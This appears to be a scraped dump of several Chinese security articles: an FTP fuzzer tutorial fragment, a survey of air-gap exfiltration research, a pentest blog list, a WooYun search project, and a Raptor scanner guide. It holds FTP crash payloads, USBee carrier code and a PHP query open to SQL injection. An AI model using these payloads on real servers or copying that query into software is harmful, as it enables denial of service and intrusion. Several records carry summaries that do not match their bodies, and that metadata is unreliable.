s.send(fuzzcmd[attr] + "" "" + buffer * 200 + '\r\n')来源：《0day安全软件漏洞分析技术》fuzzcmd是一个包含ftp命令的数组，如“cd” ""dir""等等。我们定义一个overFuzz()函数，来完成这个功能。def overFuzz(ip, port, username, password, attr)按照这种方式，ftp服务器接收到的数据如果造成溢出，程序将直接崩溃掉，程序崩溃掉之后，数据自然是发送不到ftp服务器的，我们可以按照这个依据来判断程序是否含有漏洞。attr = ""标志位"" + ""脏数据""c#判断attr其中的标志位是否为“true”，如果为“true”,则后面的脏数据则为造成程序崩溃的数据，可以供用户后面分析调试。可利用的漏洞我们用这种方法测试，而不能利用，只能造成程序异常退出的漏洞我们将采用另外一种规则。在fuzz.py中，我们定义了dDosString[], dDosChar[]两个数组，用户有自己的想法，也完全可以修改这两个变量。测试方式和前面的overfuzz一样。现在我们用某个ftp服务程序测试一下。这是其中关于ddos的测试效果。 http://p8.qhimg.com/t017ba9cf7f8e22b86b.jpghttp://p9.qhimg.com/t01c4349726ada580fc.jpg当然这个漏洞不能利用，只能造成程序异常退出。现在我们再看一下挖掘规则的问题。在fuzz.py文件中，现在我们定义了几个重要的变量。 fuzzcmd[] //包含ftp命令buffer = 50*'a' dDosString[] //例如'%%%n'dDosChar[] //例如'%'， '\'等这几个变量的值由用户决定。在文章开头，我们说过新的挖掘规则怎么添加？我们完全可以仿照overFuzz这个函数重新写一个，恩，我们试一下。观察一下我们发送数据的格式。 s.send(fuzzcmd[attr] + "" "" + buffer * 5 + '\r\n')发送的数据都是像这样的： cd aaaaaaaaaaaaaaaaaaaaaaaaa '\r\n'这也是大多数此类fuzz程序通用的格式，现在有一种新的方式，且程序中招率还不低，我测试了市面上大多ftp服务端程序，其中部分程序在处理以下数据的时候，将直接退出。 s.send(fuzzcmd[attr] + "" "" + buffer * 5) //命令后面加字符串 不添加'\r\n's.send(fuzzcmd[attr])//命令后面不加字符串 不添加'\r\n'虽然只是后面有没有'\r\n'的问题，但是很多ftp服务端程序依然没有处理此种数据的能力。(其实你也可以尝试把'\r\n'删除，添加或者在两个'\r\n'中添加其它数据，有惊喜！)  如：   'cd' + 'a'*500 + '\r\n' + 'a'*500 + '\r\n' //'\r\n'可以修改成其它类似的数据0x02 总结文章只是介绍了ftp fuzzer的小部分知识，还有很多东西文中都没有提到，包括ftp的基础知识，溢出的相关知识。这些读者都可以自己去查找相关资料，当然，这也不是本文关注的重点。希望大家能够发挥各自脑洞，不要让现有的资料或者规则局限思维方式。在ftp漏洞挖掘中，就我所知道的，挖掘ftp漏洞至少还有一种规则。文章中介绍的fuzzer其貌不全，但是在添加了大多数规则的时候，测试效果还是较好的。大多ftp服务端程序或多或少都有问题。希望大家能在这个简单模型的基础上，打造一个功能强大的ftp fuzzer。","2016-09-24 14:25:59","安全工具","DIY个人ftp fuzzer","http://nsoad.com/Security-tools/20160924/tools-445.html"
"5ccbfa9e4f2f0a0a7a69c098","前言物理隔离系统其实并不是百分之百安全的，因为现在有很多种方法能够允许攻击者从一台没有联网的计算机中窃取信息。每一种技术的实现方式是不一样的，而且每一种技术在进","blackhold","前言物理隔离系统其实并不是百分之百安全的，因为现在有很多种方法能够允许攻击者从一台没有联网的计算机中窃取信息。每一种技术的实现方式是不一样的，而且每一种技术在进行信息提取的时候所依赖的载体也不同，有的利用的是噪音，有的则利用的是电磁波。值得注意的是，攻击者同样可以使用这些方法来从一台接入了网络的设备中窃取信息。因为很多网络系统为了防止敏感信息被盗，会对进出系统的网络流量进行严格的把控，这时候攻击者就可以利用本文即将介绍的技术来从这些系统中提取数据了。一、利用设备发热量入侵未联网的PC（BitWhisper攻击）在2015年3月份，来自以色列本古里安大学的安全研究人员（Mordechai Guri， Matan Munitz和Yuval Elovici教授）设计出了一种能够从物理隔离系统中窃取数据的方法。这种方法能够帮助攻击者与目标系统建立一条隐蔽的通讯信道，并可以通过检测计算机的发热量来窃取信息。这项新型的攻击技术名为BitWhisper，攻击者可以利用这项技术来窃取类似加密密钥这样的敏感信息。BitWhisper技术可以利用计算机内部各个组件的发热量来在两台计算机之间建立一条双向通信信道。安全专家解释称，如果要从一台物理隔离的计算机中窃取信息，攻击者首先要感染另一台同样处于该物理隔离系统中的计算机。值得注意的是，通过BitWhisper技术所建立的隐蔽信道还可以用来发送控制命令，并帮助攻击者窃取敏感数据。虽然BitWhisper攻击非常的复杂，但是有趣的地方就在于我们无需对硬件做任何的修改。这种处于概念验证阶段的攻击手法要求两台计算机都要预先植入恶意软件。不仅如此，目前这项技术的数据传输速率也低得可怜，一个小时仅能传输八位数据。话虽如此，但是用来发送简单的控制命令或者窃取密码已经足够了。还有一个限制因素，就是两台计算机的间距不能离得太远（40厘米以内）。实际上，这也并不能算它的一个缺点。因为在现实中，物理隔离系统往往就放在联网机器旁边。目前的成果仅是这项研究的第一阶段，研究人员下一步打算增加物理隔离系统与控制主机的距离，并提高数据传输速率。我们都知道，计算机需要处理的数据量越大，设备的发热量也会随之升高。为了实时监控温度，计算机往往内置了许多热传感器，一旦发现机器变热即会触发散热风扇对系统进行散热处理，甚至在必要时关闭计算机以避免硬件造成损害。研究者正是利用这些热传感器来发送指令给气隙系统或者从中获取数据。实际上整个过程跟摩斯密码有点类似，发送方系统可以利用受控设备的温度升降来与接收方系统进行通信，然后后者可以利用内置的热传感器侦测出温度的变化，再将变化转译成0和1这样的二进制代码。举个例子，在下方给出的演示视频中，安全研究人员在预设的时间内将发送方系统的放热提高了1度，而接收方系统（气隙系统）由于离发送方系统比较近，所以温度也会升高，其热传感器检测到了1度的升温后，就知道发送方发过来了“1”；反之，发送方也可以通过降温1度的方式来传送“0”。如此反复几次，发送方就能够将控制命令以二进制数据的方式传送给目标物理隔离系统了。至此，大家可以设想一下，如果攻击者通过这种手段来攻击导弹发射系统，然后变更了敌方导弹的发射方向，其后果将是致命的。BitWhisper技术的演示视频：［点我观看］二、通过无线电波窃取加密密钥在此之前，安全研究专家Daniel Genkin和他的同事们设计出了一种能够从物理隔离的计算机中提取数据的方法。由于在计算机解密数据的过程中，CPU会发出特定的噪声，所以他们便可以通过分析CPU所发出的声音来提取出有价值的信息。现在，来自以色列特拉维夫大学的安全研究人员Lev Pachmanov、 Itamar Pipman和Eran Tromer在Daniel Genkin所做研究的基础上，结合计算机解密过程中会产生CPU噪声的研究结论，演示了如何通过分析计算机所发出的无线电波窃取加密密钥。除此之外，Genkin还演示了破解4096位RSA密码的方法。研究报告表明，电脑所发射的无线电波将会意外泄漏加密密钥，而利用廉价的消费级设备就可以从无线电波中提取出泄漏的密钥。为了证明这一理论，安全研究专家对系统在解密指定密文时所产生的电磁信号进行了分析。结果证明，在短短的几秒内，研究人员就成功地提取到了笔记本上的GnuPG软件私有解密密钥。在这次实验过程中，研究人员使用Funcube Dongle Pro+测量了在1.6至1.75 MHz频率之间的电磁信号，其中Funcube Dongle Pro+与一个安装了Android系统的嵌入式计算机Rikomagic MK802 IV相连接。安全研究人员表示：“我们已经从运行了GnuPG软件的各种不同型号的笔记本中成功地提取到了密钥，而且整个过程仅需要几秒钟的时间。在攻击的过程中，我们向目标设备发送了一段经过精心设计的密文，当目标计算机在解密这些密文的时候，它们便会触发解密软件内部某些特殊结构的值。这些特殊值会导致笔记本电脑周围的电磁场发生比较明显的变化，而攻击者则可以直接从这些电磁场波动中通过信号处理和密码分析技术推导出密钥。”实际上，早在好几年以前就已经有安全研究专家提出了“利用电磁辐射来窃取计算机中的加密密钥”这种设想了，但是要实现这种攻击其实并不容易。电脑附近的任何电子设备都可以接收到无线电波信号，例如将你的手机靠近电脑的音响，你就会听到音响发出的一些“滋滋”声。这种攻击的关键点在于攻击距离的远近，如果能在距离十米左右的另外一间房子里发起攻击，那么这种攻击的杀伤力将会非常恐怖。如果需要在20厘米之内才能发动攻击，那么这种攻击的危险性将会降低很多。尽管技术上可以实现，但研究人员的实验证明，想要在现实生活中使用这种攻击技术的话，目前仍然比较困难。因为计算机通常会同时执行多个任务，这就使得分析计算机中某一特定活动所产生的电磁信号难度大幅增加。三、通过智能手机入侵物理隔离网络几乎每一个对信息安全要求很高的工作环境都会有严格的安全保护措施，而物理隔离系统则更是常见。不仅如此，很多公司甚至还会禁止员工在公司内使用任何形式的USB设备。而且当工作需要涉及到类似商业机密这样的敏感信息时，某些公司的安全政策还会禁止员工在工作期间携带自己的智能手机。那么如何才能入侵一台极其安全的未联网计算机呢？其实你可能会感到惊讶，因为你并不需要任何的技术或者设备就可以实现。实际上，一台普通的智能手机就可以帮助你成功入侵一台物理隔离计算机。一群来自以色列的安全研究专家们设计出了一种新的攻击方法，这种方法可以从一台安全系数非常高的未联网计算机中窃取数据。所需的工具只有三样：GSM网络、一台普通的智能手机、以及电磁波。这个有趣的研究项目由安全专家Moradechai Guri牵头，参与了该项目的安全研究人员还有Gabi Kedma，Yisroel Mirsky，Ofer Hasson，Assaf Kachlon和Yuval Elovici。他们在实验的过程中，使用了一台摩托罗拉C123手机来进行攻击，并且在目标计算机和手机中都安装了恶意软件。由于计算机在处理或发送数据的过程中，通常都会向外发射出电磁波信号，所以研究人员就可以通过他们所开发出的恶意软件来捕获这些无线电波，并从中提取出数据。但是这也意味着，攻击者如果想要从一台被隔离的计算机中窃取数据的话，那么他必须先在这台目标计算机中安装恶意软件。四、通过声波来远程窃取物理隔离网络中的数据（Funtenna攻击）另外一种能够从物理隔离系统中窃取数据的方法是通过声波来实现的。在2015年Black Hat黑客大会上，安全研究人员展示了一种新型的黑客技术－“Funtenna”。 在Funtenna技术的帮助下，研究人员可以通过声波来窃取存储在物理隔离计算机中的数据。除了无需连网之外，这种技术还可以躲避网络流量监控和服务器防火墙等安全防护措施的检测。那么这种利用声波来窃取电脑数据的方法是否可行呢？事实上，Funtenna技术的诞生就已经证明了这种攻击方法的可行性。首先，攻击者必须要在目标设备中安装好恶意软件，目标设备可以是打印机、办公电话或者电脑。因为Funtenna技术可以利用联网设备来传送声波数据，而这种声波是人耳无法听到的。恶意软件可以控制目标设备的电子电路，并使其以攻击者预先设定好的频率振动，这样就可以向外发送无线电信号了。接下来，攻击者就可以使用AM收音机的天线来接收这些信号了。但是距离不能间隔太远，否则信号的衰减可能会导致数据出现错误。实际上，Funtenna技术是一种“硬件无关”的技术，而且窃听设备本身就是一个声波信号发射器。因此，Funtenna技术可以绕过目前所有传统的网络安全防护措施。安全研究人员发布的攻击演示视频：［视频一］［视频二］Red Balloon安全公司的首席研究员Ang Cui表示：“尽管你有网络检测和防火墙等安全防护措施，但是通过这种方式来进行传输的数据是这些安全防护措施无法检测到的。这也就意味着，我们其实并不能完全确定自己的网络是否安全，我们仍然面临着巨大的挑战。”五、通过风扇噪声来窃取加密密钥是的，你没看错。来自以色列本古里安大学的安全研究人员开发出了一种名为“Fansmitter”的恶意软件，这款恶意软件可以通过风扇噪声来窃取数据。这款恶意软件可以让电脑风扇以不同的转速旋转，并以此产生不同频率的噪音，然后利用这些噪声来窃取数据。 因为所有的计算机数据都是0和1的组合，所以Fansmitter可以控制电脑的风扇转速，并可以使其以两种不同的速度旋转，分别对应于二进制代码中的0和1。Fansmitter可以控制CPU，GPU或机箱风扇，并在一至四米内有效。研究人员认为这是一个可靠的距离，可以让智能手机或专门的录音设备记录风扇噪音。Fansmitter攻击的缺点是数据传输的速度缓慢，在实验过程中，研究人员使用1000rpm代表“0”和1600rpm代表“1”，结果每分钟能够窃取的数据量只有3比特。通过使用4000rpm和4250rpm分别代表“0”和“1“的，每分钟能够窃取到的数据量可以达到15比特。当然了，这种恶意软件也有它的局限性。研究人员表示，该恶意软件每分钟最高只能传送长度为15位的数据，但这对于发送密码和加密密钥而言已经足够了。通过这种方式来攻击计算机其实并不是很现实，但考虑到目前大多数计算机和电子设备都配备有散热风扇，所以从某种程度上来说，这类设备都存在遭到攻击的风险。但是研究人员认为，我们仍然可以通过其他的方法来避免此类物理隔离系统受到此类攻击的影响。他们可以在计算机中使用水冷系统替代风扇。另外，他们也可以选择禁止在物理隔离设备附近使用手机。六、通过硬盘噪音来攻击物理隔离计算机与之前所介绍的攻击技术一样，这种攻击方式仍然需要涉及到恶意软件的使用。来自以色列本古里安大学Negev网络安全研究中心的研究人员已经找到了使用硬盘噪音来从物理隔离计算机中提取数据的方法了。因此让我们先假设某人设法在目标设备上安装了这款名为“DiskFiltration”的恶意软件。该恶意软件的目标是在感染主机中搜寻密码、加密密钥、以及键盘输入数据。当找到所需的数据之后，恶意软件就会控制硬盘的读写臂，进行模拟的“查找”操作。于此同时，该软件还可以通过控制硬盘上驱动器机械臂的运动来产生特定的音频。利用这种方法，攻击者就可以从那些受到严密安保系统保护的计算机中窃取数据了。但是目前这种技术的有效工作距离只有 6 英尺，传输速率为每分钟180比特，并且能够在二十五分钟内窃取 4096 位长度的密钥。当今的许多硬盘都带有一种被称为自动声学管理 (Automatic Acoustic Management, AAM) 的特性，能够专门抑制这类的查找噪音，避免此类攻击。研究人员称其实验是基于AAM常开的条件之上进行的。当这款恶意软件运行在智能手机或其它带有录音功能的设备附近时，它会对某一频段的音频信号进行监听，并且以每分钟读取180位数据的速度来解析音频信号中的二进制数据，其可支持的运作距离最大为两米。当然了，用这个速度可没法下载电影，但对于窃取密码和密钥这样的数据而言，这已经足够了。不过这些技术也存在非常大的局限性，比如说，如果给电脑换上了非机械结构的固态硬盘，黑客就无法利用 DiskFiltration来窃取数据了。七、利用USBee来从物理隔离网络中提取数据早在2013年，美国国家安全局前雇员Edward Snowden就曾公开向外界演示过如何通过一个改装过的USB设备窃取目标计算机中的数据。而就在近日，以色列的一家科技公司开发出了这一恶意软件的升级版，攻击者现在可以在不需要改装USB设备的情况下实现无线传输数据。Mordechai Guri不仅是Ben-Gurion公司网络安全中心的负责人，而且他还是Morphisec终端安全公司的首席科学家。他的团队成功设计出了一种名为“USBee”的新型攻击技术，这种技术可以从物理隔离网络中提取数据。除了“USBee”之外，该团队还开发了许多类似的软件，包括可以把电脑的显卡变成一个FM信号发射器的AirHopper，可以利用热交换传输数据的BitWhisper，可以利用无线信号频率的GSMem，以及可以利用电脑风扇噪音传输数据的Fansmitter。实际上，“USBee”是一个安装在目标计算机中的恶意软件，因为它就像是在不同花朵之间往返采集蜂蜜的蜜蜂一样，它可以在不同的电脑之间任意往返采集数据，因此得名“USBee”。USBee技术可以通过电磁信号来完成数据的传输，并且使用GNU无线电接收设备和解调器来读取无线电信号。这也就意味着，即便是一台没有联网的计算机，如果感染了USBee的话，仍然是有可能泄漏机密数据的。安全研究人员在报告论文中写到：“USBee这款应用程序只依靠软件就可以利用USB适配器的电磁辐射实现短距离数据提取，这和其他的方法是完全不同的，因为我们不需要给设备添加任何用于接受无线信号的硬件设备，我们可以直接使用USB的内部数据总线就可以实现信号地接收和读取。”USBee几乎可以在任何符合USB 2.0标准的USB存储设备上运行。它的传输速率大约是每秒80个字节，更加形象地来说，它可以在十秒钟之内将一个4096位的密钥弄到手。在普通的U盘上，USBee的传输距离约为2.7米，而如果是带有线缆的USB设备，我们就可以将其电线作为接收信号的天线来使用了。这样一来，我们的攻击距离将可以扩大到8米左右。USBee的工作原理是通过向USB设备发送一系列“0”来使USB发出频率在240至480MHz的电磁信号。通过精准地控制这些频率，电磁辐射可以被调制成信号传输器，并由附近的接收器读取并解调。值得注意的是，这种软件发射器不需要对USB设备做任何硬件方面的改动。用于创建电磁载波的算法如下：inline static void fill_buffer_freq (u32 *buf, int size, double freq){int i = 0; u32 x = 0;double t = freq / 4800 * 2;for (i = 0, x = 0x00000000; i&lt;size*8; i++){x = x&lt;&lt;1;if ((int)(i*t)%2==0)x++;if((i%32)==31){*(buf++) = x;x=0x00000000;}}}当然，USBee这样的恶意软件绝对是非常高端的攻击工具，一般只有国家级秘密间谍才会使用。正如2013年Snowden所展示的那样，美国国家安全局正在研究这些攻击方法。鉴于USBee的种种优点，我们绝对有理由相信NSA这样的国家安全机构已经掌握这种信息窃取技术了。攻击演示视频：［点我观看］总结这些攻击技术虽然在理论上是可行的，但在实际生活中想要使用的话，将会受到了很大的限制。因为就目前的情况来看，其中绝大多数攻击方法的实现前提是目标计算机必须感染恶意软件。如果面对的是一台没有接入网络的计算机，那么想要对其进行感染是非常困难的，一般只有通过物理访问才可以做到。可是如果可以实现物理访问的话，还不如直接从目标计算机中窃取数据来得方便。想必大家也已经发现了，如果要最大程度地去保证一台计算机的安全，那么仅仅将网络通信断开是远远不够的，我们仍然还要部署大量严格的安全保护措施。而且在军事网络和工业控制系统这样的对安全要求极高的系统中，更加容不得半点的差错。不幸的是，攻击者如果有足够的耐心，那么他迟早都会找到绕过这些安全保护措施的方法。所以在这个世界上，没有绝对安全的系统。参考资料1.http://securityaffairs.co/wordpress/50245/hacking/diskfiltration-air-gapped-networks.html2.http://securityaffairs.co/wordpress/35298/hacking/bitwhisper-air-gapped-pcs.html3.http://securityaffairs.co/wordpress/38908/hacking/air-gapped-computer-hacking.html4.http://securityaffairs.co/wordpress/48025/hacking/encryption-keys-exfiltration.html5.http://securityaffairs.co/wordpress/48678/hacking/fansmitter-exfiltrating-data.html6.http://securityaffairs.co/wordpress/39167/hacking/funtenna-hacking-technique.html7.http://securityaffairs.co/wordpress/37950/hacking/stealing-crypto-keys-radio-emissions.html8.https://www.rt.com/usa/311689-funtenna-hacking-sound-waves/9.http://cyber.bgu.ac.il/blog/bitwhisper-heat-air-gap10.https://arxiv.org/abs/1608.0343111.http://www.tau.ac.il/~tromer/radioexp/12.http://cacm.acm.org/magazines/2016/6/202646-physical-key-extraction-attacks-on-pcs/fulltext13.https://arxiv.org/ftp/arxiv/papers/1606/1606.05915.pdf14.https://www.usenix.org/conference/usenixsecurity15/technical-sessions/presentation/guri15.http://securityaffairs.co/wordpress/50811/hacking/usbee-air-gapped-networks.html16.https://arxiv.org/ftp/arxiv/papers/1608/1608.08397.pdf","2016-09-06 11:54:34","Web安全","通过发热量、辐射、风扇噪声等入侵物理隔离网络案例（更新视频）","http://nsoad.com/Article/web/20160906/355.html"
"5ccbfa9e4f2f0a0a7a69c099","Raptor（猛禽）是一款基于WEB界面的github源代码扫描器。你只需要给它一个Github repository的URL地址，它就能进行自动扫描。","blackhold","渗透测试是寻找能够用来攻击应用程序、网络和系统的漏洞的过程，其目的是检测会被黑客攻击的安全脆弱点。渗透测试可以检测如下内容：系统对攻击的反应，存在哪些会被攻击的脆弱点，如果有，系统中哪些数据会被窃取。关于渗透测试不要将渗透测试等同于简单的漏洞扫描或者安全审计，它还要除此之外的工作。渗透测试有助于寻找非常复杂的攻击向量，找到在开发阶段没能检测出来的漏洞。在遭到入侵之后，也常使用渗透测试，检测攻击者的攻击方法，还原出攻击方法，并阻止与此相同的攻击。渗透测试是一些安全审计的主要构成部分，包括PCI-DSS规则，它要求对处理或保存支付信息的系统每年进行渗透测试。渗透测试人员会协同使用人工和自动测试，利用大量的工具进行测试。由于安全世界的动态性，以及黑客的变化性，安全专家需要掌握最新的技术、工具和漏洞利用方法，以及渗透测试技术。应用程序安全是一个新领域，物联网、容器、云等新的安全风险不断出现，渗透测试人员需要不断更新自己的知识。因此，我们提供13个最有用的渗透测试博客，帮你获取最新知识，激励你的白帽人生。其中一些有好几年的渗透测试历程了。他们都值得你关注和学习。渗透测试博客和资源排名Carnal0wnage这个博客是由一个攻击研究团队维护的，是渗透测试人员最好的信息来源之一，博客上发布了渗透测试技术、发现、新闻等等。该团队在Black Hat上开设了培训课程。PentestGeek2012年开始活跃，PentestGeek博客致力于分享作者的经验。通过它也可以了解在大公司工作的经验丰富的渗透测试者的每日工作。Darknet1999年从一个IRC频道开始发展壮大，目前是一个定期更新的博客，讨论最新的渗透测试新闻、工具和技术，有30,000多个用户。Lanmaster53Tim Tomes维护的博客，Tim在博客中会详细描述他的研究成果，博客内容覆盖从Linux Shells、DEFCON badge hacking到AppSec hacks。Marco RamilliMarco是一个安全研究者和白帽黑客。他在教育界也很有名气，在数十年的工作经历中担任了各种教授和研究员职位。他的博客是对他的知识的扩展，Macro在博客上记录他发现的一些绝妙的技术。Common Exploits由Daniel Compton维护，他是有20年的透测试经验的专家，Common Exploits旨在分享Daniel的技术，工具、漏洞利用方面的新闻，以及其它渗透测试领域的内容。SANS Penetration Testing BlogSANS对于应用程序安全方面的人来说是一个非常好的资源。这个博客上可以找到各种渗透测试任务和挑战，用于测试你的能力，也会发布特定的渗透测试工具和技术。Trail of Bits Blog由维护Trails of Bits的团队写的博客，这是一个在攻防领域都很专业的安全公司，这个博客收集了他们分享的知识，帮助企业改进或修复安全问题。DigiNinjaDigininja对渗透测试者来说是一个必须要知道的资源，主要关注Metasploit、Wifi和网络，Digininja是信息安全领域的人必读的网站。Ethical Hacking LinkedIn Group最好的获取最新渗透测试新闻的办法是，在你喜欢的社交网站中，加入到一个组里面或者关注渗透测试大牛。Ethical Hacking group是众多社区中的一个，你可以加入并分享你自己的渗透测试资源。EHacking.net对所有渗透测试相关人员来说是一个非常棒的资源，Ehacking.net是又一个必须加入到书签的网站。Seclists.org现在，依然有一部分信息安全社区依靠邮件列表获取信息，尽管这看起来有些过时。Nmap Security Scanner人员运营着Seclists.org网站，提供了受欢迎的邮件列表的清单。不管是菜鸟还是渗透测试专家都可以找到适合自己的邮件列表。Kitploit如果你在寻找特定类型的工具，你可以在Kitploit网站上找到。这里是渗透测试工具的宝库，把它加入到你的书签吧。","2016-09-06 11:50:51","安全工具","13个有用的渗透测试资源博客","http://nsoad.com/Security-tools/20160906/tools-354.html"
"5ccbfa9e4f2f0a0a7a69c09a","现在很多的ftp fuzzer已经由开发者自定义了内部挖掘规则。如果需要加入新的挖掘规则，用户除了自己写一个挖掘器，","Kong","*本文原创作者：grt1stnull，本文属FreeBuf原创奖励计划，未经许可禁止转载感谢hanc00l爬取了wooyun的网页，才使乌云关闭后，大家依旧可以访问以前的漏洞库、知识库。hanc00l发布了基于flask或者torndo的乌云公开漏洞、知识库搜索的github项目，同时发布了已经配置好的虚拟机，允许大家直接把乌云搭建在了本地。为了方便的在本地进行乌云搜索，我准备把乌云搜索搭建在树莓派上。但是，hanc00l使用的数据库是mangodb，总数据在6GB左右。32位的mangodb支持的总共数据大小最大是2GB，而我的树莓派正是32位，所以我没办法在树莓派上布置。于是利用静态的乌云漏洞库、知识库，我自己建立了数据库、搜索页面，实现了可在apache、nginx等上布置，基于mysql数据库的乌云知识库、漏洞库搜索项目。我的项目使用python依次处理静态页面，用正则抽取出信息再批量插入数据库；之后又写了个php，实现了对数据库的搜索。二.python的经验分享我在python中利用的扩展库是BeautifulSoup与MySQLdb。关于这两个库的介绍有很多，下面我主要介绍下我对这两个库的操作。1）beautifulsoup的使用from bs4 import BeautifulSoup     #引用库soup=BeautifulSoup(html,""html.parser"")       #创建BeautifulSoup对象，html为目标corps=soup.find_all('p',class_='words')      #从对象中查找类名为words的p的标签 大家可以输出一下试试2)MySQLdb的使用import MySQLdb    #引用库try:   #错误处理    	conn=MySQLdb.connect(host='localhost',port=3306,user='root',passwd='',db='wooyun',charset='utf8')     #建立连接，host主机、port端口(默认3306)、user用户、passwd密码、db操作的库、charset字符编码		cur=conn.cursor()  #获取操作游标		reload(sys)		sys.setdefaultencoding('utf-8')   #设置编码		tmp=(title1,date1,author1[0],type1[0],corp1[0],docs)  #要插入的数组		cur.execute(""INSERT INTO `bugs`(`title`,`dates`,`author`,`type`,`corp`,`doc`) VALUES(%s,%s,%s,%s,%s,%s)"",tmp)    #插入数据库		conn.commit()    #提交操作，插入时不可省		cur.close()    		conn.close()    #关闭连接，释放资源except MySQLdb.Error,e:	     print ""Mysql Error %d: %s"" % (e.args[0], e.args[1])    #如果出错，输出错误对于mysql不是很熟悉的同学如果有phpmyadmin的话可以在phpmyadmin中操作一下数据库，可以预览mysql语句。也可以在mysql命令行中执行语句尝试。三.php的经验分享虽然以前一直会php和css，但是这是第一次真正写一个动态页面。首先对参数进行过滤。判断是否为整数数字：if(is_numeric($_GET['page'])&amp;&amp;is_int($_GET['page']+0)){    	#code	}php中标签的输出是这样的！echo ""&lt;p style=\""display:inline-block;\""&gt;haha&lt;/p&gt;"";bootstrap很好用！推荐链接：bootstarap基本css样式；bootstarp组件。php对数据库的处理：现在版本的php不再推荐MYSQL函数了，建议使用PDO或者mysqli本来想使用pdo的，想感受一下预处理。但是pdo会对参数中的某些字符进行转义。无论我怎么处理都会报错，最终我决定使用mysqli了。//mysql建立连接 $db=new mysqli('localhost','root','','wooyun'); //localhost:3307//sql对象错误检查 if(mysqli_connect_errno()){ echo '&lt;br&gt;Error:Please try again later.'; exit(); }参数如上，不解释了。host有两种方式，默认端口是localhost；指定端口是localhost:3307$query0=""SELECT count(*) FROM `"".$kind.""` WHERE `title` LIKE '%"".$keywords.""%'"";  #mysql语句$num=$db-&gt;query($query0);   #执行该语句$row=$num-&gt;fetch_row();    #取得结果 四.后记在课业之余用了10天时间搭建完成，见识了很多扩展，很有帮助。我的新浪微博：http://weibo.com/grt1st项目github地址：https://github.com/grt1st/wooyun_search","2016-09-21 14:58:20","安全工具","灵活布置、可二次开发的乌云公开漏洞及知识库搜索","http://nsoad.com/Security-tools/20160921/tools-420.html"
"5ccbfa9e4f2f0a0a7a69c09b","zANTI是一款Android平台下的渗透测试工具，支持嗅探已连接的网络、支持中间人攻击测试、端口扫描、Cookie获取及路由安全测试等操作。","silence","Raptor（猛禽）是一款基于WEB界面的github源代码扫描器。你只需要给它一个Github repository的URL地址，它就能进行自动扫描。简单介绍你也可以在Raptor设置WEB监控机制，在每次进行提交或者合并分支时，它会收到消息然后进行自动化扫描。这些扫描工作是异步进行的，而且只有启动扫描的用户自己才能看到扫描结果。Raptor的一些特性：插件体系结构（新加入的插件能直接使用+生成统一报告）WEB服务可以定时自动化运行（不需要去UI界面操作）为新的漏洞或者编程语言，进行创建/编辑/删除签名的操作笔者声明一下，这个项目是为了帮助社区和初创企业进行代码安全检测，可能不会有商业产品的那样的质量保证。此外，这个工具只是为了给代码审计和研发人员提供发现漏洞的切入点，所以请不要盲目信任工具输出的内容。当然，如果你将它加入CI/CD（持续集成和持续交付）的话，那应该会不错的。在这里Raptor集成了一些插件。大家注意，为了兼容本框架，下面不少的工具/模块/库都是被改过的：MozillaScanJS – 扫描JavaScript (主要是客户端的Node.JS等等， 未来会支持Chrome和Firefox插件)Brakeman- 扫描Ruby RailsRIPS - 扫描PHPManitree – 扫描 AndroidManifest.xml等等规则包：ActionScript – 扫描Flash/Flex(ActionScript 2.0 &amp; 3.0)源FindSecurityBugs (只含规则) – 扫描Java (J2EE, JSP, Android, Scala, Groovy等等)gitrob – 扫描敏感数据的泄露(包含证书/配置/备份/私密设置的信息)安装步骤笔者安装时，在Ubuntu 14.04 x64 LAMP环境下测试通过，安装视频在这里。  $ wget https://github.com/dpnishant/raptor/archive/master.zip -O raptor.zip$ unzip raptor.zip$ cd raptor-master$ sudo sh install.sh 使用方法使用视频在这里。  cd raptor-mastersudo sh start.sh #starts the backendweb-service 然后你就可以访问本地的WEB服务了： http://localhost/raptor/ 登陆你可以用你在github服务器上注册的用户名来登陆，密码任意输入即可（但在查看扫描结果的时候，需要用到相应的用户名）。比如，如果你在github.com上注册了账户foobar，你就需要用foobar这个账户名去扫描github.com上面的repos。但是，如果你在私人的github服务器上注册了foobar_corp账户，比如： https://github.corp.company.com/ 在这时，你就需要使用账户foobar_corp，去扫描github.corp.company.com服务器上的repos。提醒一下大家，现在没有在demo版本中搞数据库，所以现在密码验证的地方可以随意输入。规则编辑器你可以使用系统自带的轻量级GUI规则编辑器，用它来加入新的规则。当然啦，你也可以使用其他文本编辑器，因为规则包文件只是普通的JSON文件。操作时只需要打开backend/rules下面的规则包，然后将修改/新增后的规则，保存在backend/rules目录下面即可。简单来说，你需要做的只有少量的编辑工作。注意，将新的规则包的文件名加入到这里，这里不要带上.rulepack的后缀，重启服务器后就大功告成啦。你可以通过这里的URL地址直接访问规则编辑器： http://localhost/raptor/editrules.php 添加规则ignore_list.rulepack：你可以添加一些针对目录名/文件名的正则匹配，避免raptor去扫一些无用的文件如jquery.min.js，或者去深入扫描/test/这样的目录。在“插件”选项里，规则插件都放在rules目录下。Issue区域是规则包文件里提到的issue的ID: Example#1, Example#2。match_type区域的值可以是regex/start/end三个选项，value区域的值是为了配合match_type区域而填写的字符串，这里需要进行Base64编码以防出现JSON syntax语法错误。解释一下，match_type中的regex是基于正则的匹配，start会匹配字符串片段开头，end会匹配字符串片段结尾。这是在扫描器扫描完issue后进行的，它会依次遍历发现的issue，然后去除其中（ignore_list.rulepack）里面匹配到的内容。规则实例：  {  ""files"": [    ""/."",    ""bootstrap"",    ""jquery"",    ""uglify"",    ""knockout"",    ""angular"",    ""backbone"",    ""ember"",    ""yui"",    ""mocha"",    ""express"",    ""yql"",    ""dataTables""  ],  ""directories"":[   ""/node_modules/"",    ""/test/""  ],  ""plugins"": [    {      ""name"":""common"",               &lt;----- Name of the Plugin      ""issue"":""HARD_CRED1"",          &lt;----- ID of the issue     ""patterns"": [        {         ""match_type"": ""start"",       &lt;----- Match type can be either""regex"", ""start"" or ""end""         ""value"": ""foreach""           &lt;----- The actual string tomatch. Base64 Encode this pattern if match_type is ""regex""        },        {          ""match_type"": ""start"",         ""value"": ""for""              },        {         ""match_type"": ""start"",         ""value"": ""elseif""        }      ]    }  ]} your_rule_name.rulepack：你自己可能也会创建一个新的规则包（rulepack）/扫描插件，然后将其加入扫描器框架。那么，下面笔者就简单介绍一下该规则包的JSON格式。  {  ""plugin_type"":""plugin_name"",   &lt;-- Give ita name (any string)  ""file_types"":[   "".java"",                     &lt;-- Add as many file extensions, you would want the scanner to pickwhile scanning    "".js""  ],  ""rules"": [    {      ""id"":""HARD_CRED1"",        &lt;-- Aunique IssueID, be creative.     ""severity"": ""High"",        &lt;-- This can be High, Medium or Low.This would accordingly show up in the 